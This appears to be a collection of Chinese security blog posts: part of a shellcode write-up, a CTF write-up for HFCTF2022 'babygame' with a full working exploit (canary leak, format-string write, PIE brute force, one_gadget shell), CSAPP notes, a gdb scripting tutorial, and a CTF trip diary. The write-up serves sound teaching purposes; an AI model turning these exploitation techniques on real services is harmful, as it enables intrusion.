<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep &#x27;_close&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220426104003427-537650546.png"></p>
<p>但是用objdump有时候似乎搜的不太对，反正搜libc中函数偏移的时候，尽量使用readelf命令</p>
<h3 id="关于打本地时监听端口的一个小坑"><a href="#关于打本地时监听端口的一个小坑" class="headerlink" title="关于打本地时监听端口的一个小坑"></a>关于打本地时监听端口的一个小坑</h3><p>当脚本写完之后，运行的时，我又踩到了最后一个坑。</p>
<p>这个脚本现在是将flag的数据读到了socket上然后将其发送到connect连接到的端口上，我们想接收这个数据就必须先监听这个端口，然后等待数据发送过来。</p>
<p><img src="/../img/2706180-20220426102522302-1487885126.png"></p>
<p>这是我最开始采用的nc -l 1000监听的方式，此时是没有任何数据过来的，最重要的是，connect压根就没有连接到这个端口上(换句话说此时压根都没有监听到这个端口），经过疯狂的调试观察（因为原本是不知道哪的问题，只能从脚本里面一点一点查）依旧没有解决，最后询问学长发现，是监听的参数有问题，下去之后通过查询nc的使用手册发现</p>
<p><img src="/../img/2706180-20220426102531360-796579110.png"></p>
<p><strong>参数l开启监听模式，参数p才是指定端口（我的问题就是压根就没指定端口，就直接输入了个1000），参数v是详细打印</strong>（一个v是稍微详细，两个v是显示的更详细，不知道这个详细和更详细是啥意思的话，自己试试就知道了）</p>
<p>这是正常的情况<br><img src="/../img/2706180-20220426102540992-803595367.png"></p>
]]></content>
      <categories>
        <category>赛题WP</category>
      </categories>
      <tags>
        <tag>orw</tag>
        <tag>shellcode</tag>
        <tag>magic_gadget</tag>
        <tag>socket+connect</tag>
      </tags>
  </entry>
  <entry>
    <title>虎符CTF2022 babygame</title>
    <url>/posts/9107d8ac.html</url>
    <content><![CDATA[<p>总结：</p>
<p>通过这道题的学习与收获有：</p>
<p>1、第一次尝试用爆破的方式来对抗PIE保护</p>
<p>2、重新温习了下猜数游戏这种类型的题目（思路就是想办法覆盖种子，自己跑个脚本）</p>
<p>3、%s顺带打印出来canary并且泄露栈中数据（权当复习了）</p>
<p>4、做题没思路的时候，就先写个半成品脚本，动态调试一下，总能得到一些有用的信息。</p>
<p>5、格式化字符串这道题考察了一个payload里面，同时写和同时读。</p>
<span id="more"></span>

<h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="/../img/2706180-20220324174639847-1315554433.png"></p>
<h2 id="题目分析："><a href="#题目分析：" class="headerlink" title="题目分析："></a>题目分析：</h2><p><img src="/../img/2706180-20220324174650447-1634759747.png"></p>
<p>发现了溢出点（不过程序开了canary)，并且有个srand函数，猜测应该题目是个猜数游戏，同时我们还可以控制seed。</p>
<p><img src="/../img/2706180-20220324174704154-1694550770.png"></p>
<p>猜数的逻辑是随机生成一个数字（可能为0,1,2），如果是0，你就要输入1；如果是1，你就要输入2；如果是2，你就要输入0。否则的话就返回0，如果满足条件就继续循环，直至100次，如果全部满足条件就返回1。</p>
<p><img src="/../img/2706180-20220324174714420-1154506487.png"></p>
<p>如果返回的是1，就可以进入这个sub_13F7函数，发现这个函数虽然没有溢出，但是存在一个格式化字符串漏洞。</p>
<h2 id="做题思路"><a href="#做题思路" class="headerlink" title="做题思路"></a>做题思路</h2><p>首先考虑一个点，程序给了溢出点，如果不用就太可惜了。用的话就要先泄露canary。可以发现read后面紧接着有一个%s将buf所打印出来，很明显这里可以把canary给带出来。</p>
<p>格式化字符串漏洞的威力很大，想利用的话，就要控制种子写个脚本跑一下即可进入存在格式化字符串漏洞的函数。</p>
<p>为了不将%s打印的内容截断，我们考虑把read输入的内容全写成\x11，直到把canary的00给覆盖了（防止00截断%s）。</p>
<p><img src="/../img/2706180-20220324174724027-646162084.png"></p>
<p>发现canary存放的是var_18。</p>
<p><img src="/../img/2706180-20220324174732236-219441364.png"></p>
<p>read输入的buf在这里<img src="/../img/2706180-20220324174740965-1855297000.png"></p>
<p>因此offset&#x3D;0x120-0x18+1&#x3D;0x109（加1的目的是为了把canary的00给覆盖了）</p>
<p>然后考虑下格式化字符串怎么用？如果只根据现在获取的信息的话，我也不知道怎么用，不过可以先把脚本写出来，调试一下，看看栈里面有没有可用的信息。</p>
<p>半成品脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p, &#x27;b * $rebase(0x1435)\nc&#x27;)</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">lib=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">libc.srand(<span class="number">0x1111111111111111</span>)</span><br><span class="line">payload=<span class="number">0x109</span>*<span class="string">&#x27;\x11&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x11&#x27;</span>*<span class="number">0x109</span>)</span><br><span class="line">canary=u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    v2=libc.rand()%<span class="number">3</span></span><br><span class="line">    <span class="keyword">if</span> v2==<span class="number">0</span>:</span><br><span class="line">        v3=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> v2==<span class="number">1</span>:</span><br><span class="line">        v3=<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> v2==<span class="number">2</span>:</span><br><span class="line">        v3=<span class="number">0</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: \n&#x27;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(v3))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>可以看到现在已经进入到了存在格式化字符串漏洞的函数。</p>
<p><img src="/../img/2706180-20220324174752621-1282773898.png"></p>
<p><img src="/../img/2706180-20220324174801443-513220805.png"></p>
<p>有两个非常值得注意的点，也是这道题的突破口，就是栈里存了一个atoi偏移16的真实地址。我们有个格式化字符串漏洞，可以打印栈中数据（不过有个条件），倘若拿到了atoi的真实地址，我们就获得了libc基地址，然后就可以去搜一下one_gadget了。别忘了，格式化字符串是可以任意地址任意写的（尝试将返回地址写成one_gadget地址）。</p>
<h2 id="问题与对策"><a href="#问题与对策" class="headerlink" title="问题与对策"></a>问题与对策</h2><p>那现在有几个问题要考虑一下。</p>
<p>第一，格式化字符串打印栈中数据的前提是需要泄露栈地址，才可以打印指定的栈内容，怎么泄露栈地址？</p>
<p>第二，拿到libc基地址，再发送one_gadget，就势必需要劫持函数的控制流，可是我们第二次的read是没办法溢出的。</p>
<p>第三，怎么对抗PIE保护？</p>
<h3 id="解释问题一："><a href="#解释问题一：" class="headerlink" title="解释问题一："></a>解释问题一：</h3><p><img src="/../img/2706180-20220324174811564-1299319852.png"></p>
<p>我们再次观察栈中的数据发现，canary被%s打印完之后，打印并不会停止（因为没有遇见00），因此下面的栈中数据也被泄露出来了，碰巧这个数据是个栈地址。因此我们只需要接收完canary之后，再接收6字节，就可以泄露栈地址了。</p>
<h3 id="解释问题二："><a href="#解释问题二：" class="headerlink" title="解释问题二："></a>解释问题二：</h3><p>由于我们第一个read虽然可以溢出，但是我们只能去填充垃圾数据把canary和leak_stack_addr给带出来，因此没办法控制返回地址，第二个read没法溢出。那我们依旧<strong>考虑格式化字符漏洞，尝试用它去修改返回地址（我们完全可以这样做，因为我们已经拿到了泄露的栈地址）</strong>，修改返回地址为哪个地址？毋庸置疑，还得是第一个read的地址，因为我们要将one_gadget地址放到返回地址。当我试图将one_gadgeet地址写入返回地址时，突然意识到开启了PIE保护。</p>
<h3 id="解释问题三："><a href="#解释问题三：" class="headerlink" title="解释问题三："></a>解释问题三：</h3><p>先看下PIE保护所造成的问题吧。</p>
<p><img src="/../img/2706180-20220324174821291-294182259.png"></p>
<p><strong>我现在试图将lea rax,[rbp-0x120]这个指令地址写入返回地址</strong>，可是发现由于PIE保护的原因，每次程序运行的时候，这个地址只有后三位不变，前面的内容都会改变。这种情况就很是尴尬，<strong>因为格式化字符串写的时候要么一次写一字节（两位），要么一次写两字节（四位）</strong>（这里就不考虑一次写四字节的情况了）</p>
<p>因此我们根本没办法去正好控制后三位，那我们只控制后两位，让第三位去继承原本返回地址的内容？</p>
<p>返回地址</p>
<p><img src="/../img/2706180-20220324174830880-911959010.png"></p>
<p>要修改成的地址<br><img src="/../img/2706180-20220324174839396-1962481222.png"></p>
<p>可以发现，这俩并不凑巧相同。那控制后四位（即两字节）？</p>
<p><strong>控制后四位的话，我们确实可以定死后三位，但是倒数第四位由于PIE的原因，它是随机的</strong>，这条路行不通？</p>
<p>经过我尝试了许多别的方法，无论如何也都走不通，最后我又拐回来想这条路，突然意识到一件事，只有仅仅是倒数第四位随机而已，<strong>如果爆破呢？我们就随便蒙一个倒数第四位，正确的概率是1&#x2F;16</strong>(已经不低了)(意思就是说每次PIE，使基址倒数第四位是随机的（后三位地址是固定的），我们可以蒙一个数，然后去运行程序，只要有一次运行的程序基址倒数第四位是我们蒙的数字，就说明我们此时爆破成功），此时就可以顺利返回到one_gadget的地址了。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">lib=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">    <span class="comment">#p=process(&#x27;./a&#x27;)</span></span><br><span class="line">    <span class="comment">#gdb.attach(p, &#x27;b * $rebase(0x1435)\nc&#x27;)</span></span><br><span class="line"></span><br><span class="line">    libc.srand(<span class="number">0x1111111111111111</span>)</span><br><span class="line">    payload=<span class="number">0x109</span>*<span class="string">&#x27;\x11&#x27;</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x11&#x27;</span>*<span class="number">0x109</span>)</span><br><span class="line">    canary=u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        v2=libc.rand()%<span class="number">3</span></span><br><span class="line">        <span class="keyword">if</span> v2==<span class="number">0</span>:</span><br><span class="line">            v3=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> v2==<span class="number">1</span>:</span><br><span class="line">            v3=<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> v2==<span class="number">2</span>:</span><br><span class="line">            v3=<span class="number">0</span></span><br><span class="line">        p.recvuntil(<span class="string">&#x27;: \n&#x27;</span>)</span><br><span class="line">        p.send(<span class="built_in">str</span>(v3))</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;leak_addr&#x27;</span>)</span><br><span class="line">    payload=<span class="string">&#x27;%42178c%9$hn&#x27;</span>+<span class="string">&#x27;aaaa&#x27;</span>+<span class="string">&#x27;%27$p&#x27;</span>+<span class="string">&#x27;aaa&#x27;</span>+p64(leak_addr-<span class="number">520</span>)</span><br><span class="line">    <span class="comment">#42178就是十六进制的a4c2,我赌倒数第四位是a   -&gt;.-&gt;</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    atoi_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">16</span></span><br><span class="line">    libc_base=atoi_addr-lib.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    sys_addr=lib.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">    bin_sh_addr=lib.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()+libc_base</span><br><span class="line">    payload2=<span class="number">0x108</span>*<span class="string">&#x27;a&#x27;</span>+p64(canary)+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x4f302</span> +libc_base)</span><br><span class="line">    p.send(payload2)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.send(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line">times=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = process(<span class="string">&quot;./a&quot;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">        p.interactive()</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        times += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;*&quot;</span>*<span class="number">10</span>+<span class="built_in">str</span>(times)+<span class="string">&quot; times&quot;</span>+<span class="string">&quot;*&quot;</span>*<span class="number">10</span>)</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>



<p><img src="/../img/2706180-20220324174853430-1511606619.png"><br>PS：这道题如果打远程的话，是需要用题目中给出的动态库，如果本地的话，用自己本地的动态库就行</p>
]]></content>
      <categories>
        <category>赛题WP</category>
      </categories>
      <tags>
        <tag>one_gadget</tag>
        <tag>爆破</tag>
        <tag>猜数游戏</tag>
        <tag>泄露canary</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP-第二章 信息的表示和处理（笔记）</title>
    <url>/posts/6a3eb07a.html</url>
    <content><![CDATA[<h2 id="信息存储"><a href="#信息存储" class="headerlink" title="信息存储"></a>信息存储</h2><p>如果描述一个房子的面积，我们可以用平方米这个单位，描述一棵树的高度可以用米为单位，又或者描述一个沙袋的重量可以用千克为单位，同样计算机中的内存大小也有单位来描述。</p>
<span id="more"></span>

<p>在第一章的笔记中提到了 <code>bit</code> 的概念，一个二进制中的 <code>0</code> 或 <code>1</code> 就是一个 <code>bit</code>，而 <code>8</code> 个 <code>bit</code> 就是一个字节（ <code>byte</code> ）。我们如果说一个电脑的运行内存为 <code>4GB</code> ，那么这个 <code>1GB</code> 就是 <code>1024MB</code> ，而 <code>1MB</code> 就是 <code>1024KB</code> ，<code>1KB</code> 是 <code>1024B</code> 此时的 <code>B</code> 也就是 <code>byte</code> ，所以现在我说 <code>4GB</code> ，你可能大概就知道这有多少个 <code>0</code> 或 <code>1</code> 了（至少这多到你无法想象）</p>
<p>现在大多数计算机（也就是 <code>64</code> 位机器）都使用 <code>8</code> 字节作为最小的可寻址的内存单位，而不是使用内存中单独的位（也就是 <code>bit</code>）。机器级程序将内存视为一个非常大的字节数组，称为虚拟内存（之后提到的内存，通常默认指虚拟内存，这个虚拟地址是展示给程序的概念性映像，虚拟也为假象，这个手段是由硬件和操作系统来实现的）。内存中的<strong>每个字节都有自己的地址也就是唯一数字标识</strong>，</p>
<h3 id="十六进制表示法"><a href="#十六进制表示法" class="headerlink" title="十六进制表示法"></a>十六进制表示法</h3><p>如果人直接去对着二进制数据进行分析，会感到阅读困难且冗长，如果使用十进制的话虽然方便了人类阅读但是与位模式的互相转换又会很麻烦，因此就诞生了十六进制表示法。<code>0 ~ 9</code> 和 <code>A ~ F</code> 表示了 <code>16</code> 个可能的值。一个字节的值域为 <code>0 ~ 255</code> ，用十六进制则表示为 <code>0x00 ~ 0xFF</code> ，以 <code>0x</code> 或 <code>0X</code> 开头的数字被认为是十六进制。字符 <code>A ~ F</code> 的大小写无所谓，即便是 <code>0xfA1Bd</code> 这样的大小写混合。</p>
<p>十六进制和二进制直接可以很快的进行转换，比如 <code>0x173A4C</code></p>
<table>
<thead>
<tr>
<th>十六进制</th>
<th>1</th>
<th>7</th>
<th>3</th>
<th>A</th>
<th>4</th>
<th>C</th>
</tr>
</thead>
<tbody><tr>
<td>二进制</td>
<td>0001</td>
<td>0111</td>
<td>0011</td>
<td>1010</td>
<td>0100</td>
<td>1100</td>
</tr>
</tbody></table>
<p>你可以发现十六进制转为二进制，你只需要看每一个数字将其转换为对应二进制，最后拼凑起来即可，所以它的二进制表示为 <code>000101110011101001001100</code></p>
<p>二进制转换十六进制也是这个方法，不过当位<strong>总数不是 <code>4</code> 的倍数时，需要在最左侧补 <code>0</code></strong> ，最后将每个 <code>4</code> 位组转换为对应的十六进制数字</p>
<p>逻辑运算</p>
<p>位级运算</p>
<p>移位运算</p>
<p>字节顺序</p>
<p>大端序，小端序</p>
<h3 id="补码"><a href="#补码" class="headerlink" title="补码"></a>补码</h3><p>存储 运算与访问</p>
]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>CSAPP笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>用python来自定义gdb命令</title>
    <url>/posts/26ba4673.html</url>
    <content><![CDATA[<p><code>gdb</code> 是一款 <code>linux</code> 下常用的程序调试器，有时可能我们会根据自己的需求来尝试写一些自定义的 <code>gdb</code> 命令，而通过 <code>python</code> 语言来编写的话，是再好不过了，下面记录一下如何用 <code>python</code> 语言编写自己的 <code>gdb</code> 命令</p>
<span id="more"></span>

<p>有两种方法，第一种是直接在 <code>.gdbinit</code> 文件中来编写，如果只是自定义一个或很少的命令采用这种方法是可以的。（ <code>gdb</code> 启动时，会在当前用户的主目录寻找一个 <code>.gdbinit</code> 的文件，如果该文件存在的话将执行该文件的所有命令）</p>
<p>假设现在编写一个获取 <code>libc</code> 基地址的命令,代码如下</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">python</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">libc_cmd</span>():</span><br><span class="line">    recv_data = gdb.execute(<span class="string">&quot;vmmap&quot;</span>,to_string=<span class="literal">True</span>)</span><br><span class="line">    line = recv_data.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> line:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;libc&quot;</span> <span class="keyword">in</span> i:</span><br><span class="line">            <span class="built_in">list</span>=i.split(<span class="string">&quot;    &quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\033[0;31;47mlibc base\033[0m    &quot;</span>,<span class="built_in">list</span>[<span class="number">1</span>])</span><br><span class="line">end </span><br><span class="line"></span><br><span class="line">define libc</span><br><span class="line">    python libc_cmd()</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>这个格式是先在一行写下 <code>python</code> ，接下来正常编写函数即可（ <code>gdb.execute</code> 函数可以在 <code>gdb</code> 内部执行命令，并且将命令的执行结果返回给调用者 ），最后以 <code>end</code> 结尾。然后再用 <code>define</code> 来定义这个命令的名称，然后下一行用 <code>python</code> 调用上面的函数，最后以 <code>end</code> 结尾即可。</p>
<p>把上面的代码复制到 <code>.gdbinit</code> 文件中，启动 <code>gdb</code> 即可正常使用 <code>libc</code> 命令</p>
<p>但如果想自定义的命令很多的话，全部把命令都写到 <code>.gdbinit</code> 会显得很臃肿，所以可以把自定义的命令单独都存放到一个 <code>py</code> 文件中。比如创建一个叫做 <code>command.py</code> 的文件，然后在 <code>.gdbinit</code> 的开始写入 <code>source /home/zikh/Desktop/command.py</code> 即可，然后开始在 <code>command.py</code> 文件中编写命令。</p>
<p>比如我这里编写一个获取 <code>libc</code> 基地址、堆地址和程序基地址的命令,代码如下</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">base_cmd</span>():</span><br><span class="line">    recv_data = gdb.execute(<span class="string">&quot;vmmap&quot;</span>,to_string=<span class="literal">True</span>)</span><br><span class="line">    lines = recv_data.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    flag=<span class="number">0</span></span><br><span class="line">    flag1=<span class="number">0</span></span><br><span class="line">    flag2=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">match</span>=[]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;home&quot;</span> <span class="keyword">in</span> line <span class="keyword">and</span> flag1==<span class="number">0</span>:</span><br><span class="line">            flag1=<span class="number">1</span></span><br><span class="line">            line=line.split()</span><br><span class="line">            <span class="keyword">for</span> element <span class="keyword">in</span> line:</span><br><span class="line">                <span class="keyword">match</span>=re.findall(<span class="string">&quot;(0x\w+)&quot;</span>,element)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                    base_addr=<span class="keyword">match</span>[<span class="number">0</span>]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;heap&quot;</span> <span class="keyword">in</span> line <span class="keyword">and</span> flag==<span class="number">0</span>:</span><br><span class="line">            flag=<span class="number">1</span></span><br><span class="line">            line=line.split()</span><br><span class="line">            <span class="keyword">for</span> element <span class="keyword">in</span> line:</span><br><span class="line">                <span class="keyword">match</span>=re.findall(<span class="string">&quot;(0x\w+)&quot;</span>,element)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                    heap_addr=<span class="keyword">match</span>[<span class="number">0</span>]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;libc&quot;</span> <span class="keyword">in</span> line <span class="keyword">and</span> flag2==<span class="number">0</span>:</span><br><span class="line">            flag2=<span class="number">1</span></span><br><span class="line">            line=line.split()     </span><br><span class="line">            <span class="keyword">for</span> element <span class="keyword">in</span> line:</span><br><span class="line">                <span class="keyword">match</span>=re.findall(<span class="string">&quot;(0x\w+)&quot;</span>,element)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                    libc_addr=<span class="keyword">match</span>[<span class="number">0</span>]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\033[0;31;47mbase address\033[0m\t\t\t&quot;</span>,base_addr)</span><br><span class="line">    <span class="keyword">if</span> flag==<span class="number">0</span>:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;\033[0;32;47mno heap\033[0m&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[0;31;47mheap base\033[0m\t\t\t&quot;</span>,heap_addr)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\033[0;31;47mlibc base\033[0m\t\t\t&quot;</span>,libc_addr)</span><br></pre></td></tr></table></figure>

<p>这个格式比较简单，首先在 <code>py</code> 文件的开头导入 <code>gdb</code> 模块，然后正常定义函数即可，最后写上 <code>gdb.execute(&quot;define base\n\tpython base_cmd()\nend&quot;)</code> ，这句一定要有，这个可以理解为你输入一个命令，然后 <code>gdb</code> 要查找是否存在这个命令的定义，只有加上最后一句，才能够识别出来这个命令。（每写一个命令，都需要加上 <code>gdb.execute</code> 的命令声明）</p>
<p>实际运行情况如下：</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041312961.png" alt="image-20230204131253466" style="zoom:50%;" />



<p>如果要写带参数命令的话，可以参考以下格式</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hex_cmd</span>(<span class="params">arg0</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;decimal :\t&quot;</span>,arg0)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hexadecimal\t&quot;</span>,<span class="built_in">hex</span>(arg0))</span><br><span class="line">gdb.execute(<span class="string">&quot;define hex\n\tpython hex_cmd(int($arg0))\nend&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041315210.png" alt="image-20230204131502126"></p>
<p>本文只是简单记录一下如何用 <code>python</code> 来编写 <code>gdb</code> 命令，至于编写什么命令，还是要根据自己的实际需求来考虑。</p>
]]></content>
      <categories>
        <category>尝试开发小工具</category>
      </categories>
  </entry>
  <entry>
    <title>强网拟态线下游记</title>
    <url>/posts/b0250b87.html</url>
    <content><![CDATA[<h3 id="启程："><a href="#启程：" class="headerlink" title="启程："></a>启程：</h3><p>在强网拟态线上赛拿到了进入决赛的资格，因为疫情原因大家都以为决赛会在线上，而起初也确实如此，赛方说是决赛也进行线上赛，不过随着国家对于防疫政策的放开，在临近决赛的时候赛方最终决定可以出十支队伍来南京参加线下赛，而其他五十支队伍在线上进行。</p>
<p>菜鸡的我自然是渴望线下赛的，并且在家里也没有什么事情(除了学车和考试…),最终决定前往南京参加线下赛并且与平常交流甚多的师傅们见面。于是买票，出发，前往南京！</p>
<span id="more"></span>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212191125243.png" alt="image-20221219112522111"></p>
<p>该说不说，因为路费报销限额是1500，坐高铁一等座是真的香，然后外出也不用考虑是地铁倒公交啥的，直接出租车就是冲。</p>
<h3 id="见面："><a href="#见面：" class="headerlink" title="见面："></a>见面：</h3><p>去到酒店见到了平常线上经常交流的师傅们(h1J4cker师傅 winmt师傅还有三哈师傅等等)。winmt师傅实在是太高辣，一米九多~   </p>
<p>酒店确实大，头两次只能靠着箭头标志找到房间，酒店房间也挺不错的</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212221116485.jpg" alt="img"></p>
<p>陆陆续续人齐了之后先去医院排了一个半小时的队伍做了核酸，完事之后去聚餐吃了火锅</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212221112652.jpg" alt="img"></p>
<h3 id="比赛："><a href="#比赛：" class="headerlink" title="比赛："></a>比赛：</h3><p>第二天起来先去干了早饭，说实话这个自助的早餐确实牛皮，吃了五天不重样的早餐(馄饨，汤面，灌汤包，蔬菜沙拉，小笼包，干煸豆角等等太多了记不清)</p>
<p>接着做了第二班车去了比赛会场</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212221121829.jpg" alt="img" style="zoom:50%;" />

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212221122695.jpg" alt="img" style="zoom:50%;" />

<p>上午准备了下环境，然后是开幕式好多领导上去讲话 比赛是十二点开始，为了尽量不影响比赛肯定是午餐在十二点前提供，又是干饭…</p>
<p>比赛正式开始之后，我记得是有三个赛道，一个赛道放的是CTF题目，PWN有四道题，我和h1师傅一人做了一道，我打的是一个猜测随机数+SSP Leak，h1师傅做的那个是堆题，整体不算难，但是用ida打开之后的数据是混乱的(这里不知道是怎么实现的)，反正主要是靠交互来完成的大体脚本，最后的一些细节是读了下汇编调了一下搞定的。另外两道pwn，一个是格式化字符串加栈溢出，正常来说这个题肯定是要被打烂的，但是这个题上了拟态防御，就是我的一个payload打过去，服务端那里挂起的好几个程序的回显一样才可以正常运行，因此格式化字符串和栈溢出其实全都用不了，一道真正意义上的无解PWN(没错，这题放出来就不是让得分的，而是为了证实这个拟态防御的强大…)，另外一道在得知了也是无解之后就没再看了。</p>
<p>然后pwn做完之后，就没事干了。因为这个比赛考的主要是对设备的真实攻击和拟态防御而并非是CTF，所以CTF题目只是为了解出来得分，然后去做其他赛道的题目，攻击真实设备。</p>
<p>后面的几天PWN手就做大牢了，除了一个ADAS和T-BOX4这俩拿到了二进制文件，剩下的题目基本都没有PWN手的事情了，那两个二进制文件都是跟着winmt师傅分析学习了一下，都是aarch64的程序我记得。目的是找漏洞写报告，并不是拿shell(因为给的二进制文件也不完整)</p>
